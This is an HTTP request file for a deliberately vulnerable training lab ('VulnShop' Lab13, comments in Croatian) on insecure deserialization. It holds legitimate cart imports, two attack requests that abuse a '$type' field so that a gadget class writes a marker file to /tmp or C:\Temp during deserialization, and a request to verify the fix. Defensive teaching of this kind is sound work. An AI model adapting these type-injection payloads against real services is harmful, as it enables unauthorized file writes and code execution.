### =====================================================================
### Lab13 – A08 Software or Data Integrity Failures: nesigurna deserijalizacija (CWE-502)
### Upute: docs/labs/lab13-deserialization.md
### Gadget DiagnosticsTask zapisuje samo bezopasnu tekstualnu marker datoteku.
### =====================================================================
@host = http://localhost:5080

### 1) Legitimna košarica (2 stavke) – 200, itemCount 2
POST {{host}}/api/lab13/cart/import
Content-Type: application/json

{"owner": "ana", "items": [{"productId": 1, "name": "Laptop", "quantity": 1}, {"productId": 2, "name": "Slušalice", "quantity": 2}]}

### 2) Legitimna košarica s eksplicitnim tipom ($type) – ranjiva verzija ga poštuje
POST {{host}}/api/lab13/cart/import
Content-Type: application/json

{"$type": "VulnShop.Api.Labs.Lab13.Cart, VulnShop.Api", "Owner": "ana", "Items": [{"ProductId": 1, "Name": "Laptop", "Quantity": 1}]}

### 3) NAPAD (Windows): klijent bira klasu DiagnosticsTask → zapis datoteke tijekom deserijalizacije.
###    Ranjivo: 200 {"type":"DiagnosticsTask"} i datoteka C:\Temp\vulnshop-lab13.txt postoji (mapa C:\Temp mora postojati)
POST {{host}}/api/lab13/cart/import
Content-Type: application/json

{"$type": "VulnShop.Api.Labs.Lab13.DiagnosticsTask, VulnShop.Api", "ReportPath": "C:\\Temp\\vulnshop-lab13.txt", "Content": "PWNED"}

### 4) NAPAD (Linux/macOS): isto, datoteka /tmp/vulnshop-lab13.txt
POST {{host}}/api/lab13/cart/import
Content-Type: application/json

{"$type": "VulnShop.Api.Labs.Lab13.DiagnosticsTask, VulnShop.Api", "ReportPath": "/tmp/vulnshop-lab13.txt", "Content": "PWNED"}

### 5) PROVJERA POPRAVKA: obrišite marker datoteku, ponovite 3)/4) → 400 i datoteka NE nastaje; 1) i dalje radi
POST {{host}}/api/lab13/cart/import
Content-Type: application/json

{"$type": "VulnShop.Api.Labs.Lab13.DiagnosticsTask, VulnShop.Api", "ReportPath": "/tmp/vulnshop-lab13.txt", "Content": "PWNED"}
